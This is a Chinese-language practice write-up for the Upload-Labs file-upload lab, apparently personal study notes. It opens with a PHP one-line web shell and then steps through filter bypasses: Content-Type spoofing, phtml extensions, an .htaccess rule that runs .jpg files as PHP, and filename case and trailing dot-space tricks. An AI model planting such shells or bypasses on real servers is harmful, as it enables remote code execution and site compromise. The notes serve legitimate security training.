### Upload-Lab



#### 一句话木马：

```php
<?php
@eval($_POST[123]);
?>
```



#### 1. 前端js绕过

本pass在客户端使用js对不合法图片进行检查！

**做法一：**一句话木马，改文件后缀为jpg，burp抓包恢复文件后缀为php，发包得到返回，蚁剑链接即可

![](E:\CSA\Web\Upload\pics\屏幕截图 2023-10-09 163614.png)

**做法2：**修改本地js文件

burp上传文件抓包抓不到证明是js本地判断，fn12设置禁用javascript之后即可



#### 2. content type绕过

```javascript
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
```

burp可以抓到包，文件合法性在后端进行

上传一个jpg文件，把content type删掉后报错，说明验证在这里进行

content type改为image/jpeg即可

![](E:\CSA\Web\Upload\pics\屏幕截图 2023-10-09 173558.png)

#### 3. 特殊后缀绕过（php3,php5）

![屏幕截图 2023-10-09 174108](E:\CSA\Web\Upload\pics\屏幕截图 2023-10-09 174108.png)

根据红字猜测是黑名单

```javascript
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空
//源码堵了其他绕过方式
        
        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

源码堵了其他绕过方式，没有堵php3，php5，php7，phtml

修改后缀为phtml尝试上传，成功

#### 4. .htaccess绕过

```
针对Apache的配置文件

.htaccess是分布式配置文件（可以有多个），一般用于URL重写，认证，访问控制等，优先级高，可覆盖Apache服务器的主要配置文件（非Apache服务器没该配置文件）。
httpd-conf包含Apache HTTP服务器全局行为和默认设置，优先级低

作用范围：
.htaccsess文件的作用范围更加局部，通常位于网站的根目录或特定目录，并且只影响该目录及其子目录。每个目录都可以有自己的.htaccess文件。httpd.config文件的作用范围更为全局，它是Apache主配置文件，影响整个服务器。

使用方式：
.htaccsess文件可以通过文本编辑器直接进行修改或创建，修改后会即时生效，无需重启Apache服务器。
httpd.conf文件通常需要管理员权限，修改后重启Apache服务器才能生效。

如果htaccess不生效，在服务器配置文件httpd.conf里更改根目录AllowOverride值为All
AllowOverride的值：
None：不允许.htaccess文件覆盖任何配置选项
All：允许.htaccess文件覆盖所有配置选项
AuthConfig：允许.htaccess文件覆盖身份验证相关的配置选项，如AuthType AuthName
FileInfo：允许.htaccess文件覆盖文件和目录相关的配置选项，如DirectoryIndex DefaultType
Indexes：允许.htaccess文件覆盖目录索引相关的配置选项，如Options IndexOptions
```

#### 

```
.user.ini
通常位于Web应用程序的根目录下，用于覆盖或追加全局配置文件(php.ini)
作用于存放该文件的目录及其子目录，优先级高
立即生效

php.ini
存储对整个php环境生效的配置选项，位于php安装目录
作用于所有该php环境的php请求，优先级低
重启服务器生效
```



.htaccess:

```
AddType application/x-httpd-php .jpg .txt
```

用php方式打开jpg和txt

先上传.htaccess再上传shell.jpg即可



#### 5. 大小写绕过

观察源码没有代码：

```
$file_ext = strtolower($file_ext);
```

确定可以使用大小写绕过，改文件名为shell.Php即可



#### 5. 点加空格加点绕过

burpsuite抓包改文件名称为shell.php. .上传即可



#### 6. 空格绕过

观察源码没有代码

```
$file_ext = trim($file_ext);
```

改文件名为shell. php即可

需要注意的是默认去除文件末尾的空格是只在windows环境下生效，linux环境的靶机不可以使用该方法
